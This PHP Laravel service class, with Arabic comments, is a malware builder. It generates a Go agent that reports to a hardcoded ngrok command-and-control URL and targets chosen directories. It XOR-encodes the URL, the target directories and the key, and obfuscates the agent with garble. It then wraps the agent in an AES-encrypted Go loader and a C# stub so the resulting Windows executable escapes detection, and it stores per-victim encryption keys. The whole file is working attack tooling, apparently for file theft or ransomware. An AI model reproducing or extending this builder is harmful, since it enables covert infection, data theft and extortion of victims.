<?php

namespace App\Services;

use App\Models\Payload;
use InvalidArgumentException;

class PayloadService
{
    private int $xorKey = 0x5A; 
    private string $goBinPath = '/usr/local/go/bin';
    private string $garblePath = '/home/u113/go/bin/garble';

    public function createPayloadProfile($profileId, $platform = 'windows', array $options = [])
    {
        // ... (هذه الدالة لا نحتاجها في الوقت الحالي، لكن تركناها فارغة لتجنب الأخطاء)
    }

    public function buildLoaderPayload($profileId, $targetDirs)
    {
        // معالجة إذا تم تمرير كائن Payload
        if (is_object($profileId)) {
            $targetDirs = $targetDirs ?? $profileId->target_directories;
            $profileId = $profileId->id;
        }

        $tempDir = storage_path('app/temp/'.uniqid());
        if (!file_exists($tempDir)) {
            mkdir($tempDir, 0777, true);
        }
        
        // ==========================================
        // الخطوة 1: بناء البايلود الأساسي (Agent.exe)
        // ==========================================
        $originalScriptPath = $tempDir.'/agent.go';
        $originalExePath = $tempDir.'/agent.exe';
        
        $agentCode = $this->getClientCodeTemplate($targetDirs, $profileId);
        file_put_contents($originalScriptPath, $agentCode);
        
        $buildCmd = sprintf(
            'export PATH=%s:$PATH; GOOS=windows GOARCH=amd64 %s -tiny -literals build -o %s %s',
            escapeshellarg($this->goBinPath),
            escapeshellarg($this->garblePath),
            escapeshellarg($originalExePath),
            escapeshellarg($originalScriptPath)
        );
        exec($buildCmd);

        if (!file_exists($originalExePath)) {
            throw new \Exception("Failed to build original payload.");
        }

        // ==========================================
        // الخطوة 2: تشفير البايلود وبناء الـ Go Loader
        // ==========================================
        $aesKey = random_bytes(32);
        $payloadData = file_get_contents($originalExePath);
        
        $cipher = "aes-256-cbc";
        $ivLen = openssl_cipher_iv_length($cipher);
        $iv = openssl_random_pseudo_bytes($ivLen);
        $ciphertext = openssl_encrypt($payloadData, $cipher, $aesKey, OPENSSL_RAW_DATA, $iv);
        
        $encryptedPayload = $iv . $ciphertext;

        $goEncryptedPayload = $this->toGoByteSlice($encryptedPayload);
        $goAesKey = $this->toGoByteSlice($aesKey);

        $loaderStub = file_get_contents(resource_path('stubs/loader.go'));
        $loaderStub = str_replace('__ENCRYPTED_PAYLOAD__', $goEncryptedPayload, $loaderStub);
        $loaderStub = str_replace('__AES_KEY__', $goAesKey, $loaderStub);

        $loaderScriptPath = $tempDir.'/loader.go';
        $finalLoaderDir = storage_path('app/public/payloads');
        if (!file_exists($finalLoaderDir)) {
            mkdir($finalLoaderDir, 0777, true);
        }
        $finalLoaderPath = $finalLoaderDir.'/loader_'.$profileId.'.exe';
        
        file_put_contents($loaderScriptPath, $loaderStub);
        
        $loaderBuildCmd = sprintf(
            'export PATH=%s:$PATH; GOOS=windows GOARCH=amd64 %s -tiny -literals build -o %s %s',
            escapeshellarg($this->goBinPath),
            escapeshellarg($this->garblePath),
            escapeshellarg($finalLoaderPath),
            escapeshellarg($loaderScriptPath)
        );
        exec($loaderBuildCmd);

        if (!file_exists($finalLoaderPath)) {
            throw new \Exception("Failed to build Go Loader.");
        }

        // ==========================================
        // الخطوة 3: بناء الـ C# Stub
        // ==========================================
        $finalStubPath = $this->buildCSharpStub($finalLoaderPath, $profileId);

        // ==========================================
        // الخطوة 4: تنظيف الملفات المؤقتة
        // ==========================================
        @unlink($originalScriptPath);
        @unlink($originalExePath);
        @unlink($loaderScriptPath);
        @unlink($finalLoaderPath);

        return $finalStubPath;
    }

    public function buildCSharpStub($goLoaderPath, $profileId)
    {
        // 1. قراءة ملف الـ Go Loader
        if (!file_exists($goLoaderPath)) {
            throw new \Exception("Go Loader not found.");
        }
        $goLoaderData = file_get_contents($goLoaderPath);

        // 2. تشفير الـ Go Loader بـ AES
        $cipher = "aes-256-cbc";
        $key = random_bytes(32);
        $iv = random_bytes(16);
        $encryptedData = openssl_encrypt($goLoaderData, $cipher, $key, OPENSSL_RAW_DATA, $iv);

        // 3. تحويل البيانات إلى صيغة C#
        $csEncryptedData = $this->toCSharpByteArray($encryptedData);
        $csKey = $this->toCSharpByteArray($key);
        $csIv = $this->toCSharpByteArray($iv);

        // 4. قراءة قالب C# وحقن البيانات
        $stubFile = resource_path('stubs/csharp_loader.cs');
        $csCode = file_get_contents($stubFile);
        
        $csCode = str_replace('__ENCRYPTED_DATA__', $csEncryptedData, $csCode);
        $csCode = str_replace('__AES_KEY__', $csKey, $csCode);
        $csCode = str_replace('__AES_IV__', $csIv, $csCode);

        // 5. حفظ الكود في ملف مؤقت
        $tempDir = storage_path('app/temp/'.uniqid());
        mkdir($tempDir, 0777, true);
        $csFilePath = $tempDir.'/loader.cs';
        file_put_contents($csFilePath, $csCode);

        // 6. تعريف مسار الملف النهائي
        $finalStubPath = storage_path('app/public/payloads/stub_'.$profileId.'.exe');
   
        $buildCmd = sprintf(
    'mcs -out:%s -r:/usr/lib/mono/4.5/System.Windows.Forms.dll -r:/usr/lib/mono/4.5/System.Drawing.dll %s',
    escapeshellarg($finalStubPath),
    escapeshellarg($csFilePath)
);
        exec($buildCmd . ' 2>&1', $output, $returnCode);

        if ($returnCode !== 0) {
            throw new \Exception("C# build failed: " . implode("\n", $output));
        }

        // تنظيف
        @unlink($csFilePath);

        return 'payloads/stub_'.$profileId.'.exe';
    }

    protected function getClientCodeTemplate($targetDirs, $profileId = null)
    {
        $c2ServerUrl = 'https://babble-flagman-divorcee.ngrok-free.dev/api/v1/report';
        $stubFile = resource_path('stubs/aes_agent.go');
        $code = file_get_contents($stubFile);

        if (is_array($targetDirs)) {
            $formattedDirs = implode(',', $targetDirs);
        } else {
            $formattedDirs = $targetDirs;
        }

        $aesKey = bin2hex(random_bytes(16)); 

        if ($profileId) {
            Payload::updateOrCreate(
                ['id' => $profileId],
                ['encryption_key' => $aesKey, 'encryption_type' => 'AES']
            );
        }

        $encC2Url = $this->xorEncrypt($c2ServerUrl, $this->xorKey);
        $encTargetDirs = $this->xorEncrypt($formattedDirs, $this->xorKey);
        $encAesKey = $this->xorEncrypt($aesKey, $this->xorKey);

        $code = str_replace('__C2_SERVER_URL__', $encC2Url, $code);
        $code = str_replace('__TARGET_DIRECTORIES__', $encTargetDirs, $code);
        $code = str_replace('__ENCRYPTED_AES_KEY__', $encAesKey, $code);
        $code = str_replace('__XOR_KEY__', '0x' . dechex($this->xorKey), $code);

        return $code;
    }

    private function toGoByteSlice($data): string
    {
        $hex = bin2hex($data);
        $goBytes = '[]byte{';
        for ($i = 0; $i < strlen($hex); $i += 2) {
            $goBytes .= '0x' . substr($hex, $i, 2) . ', ';
        }
        $goBytes = rtrim($goBytes, ', ') . '}';
        return $goBytes;
    }

    private function toCSharpByteArray($data): string
    {
        $bytes = array_map('ord', str_split($data));
        return implode(',', $bytes);
    }

    private function xorEncrypt(string $text, int $key): string
    {
        $encrypted = '';
        for ($i = 0; $i < strlen($text); $i++) {
            $encrypted .= chr(ord($text[$i]) ^ $key);
        }
        $hex = bin2hex($encrypted);
        $goBytes = '[]byte{';
        for ($i = 0; $i < strlen($hex); $i += 2) {
            $goBytes .= '0x' . substr($hex, $i, 2) . ', ';
        }
        $goBytes = rtrim($goBytes, ', ') . '}';
        return $goBytes;
    }
}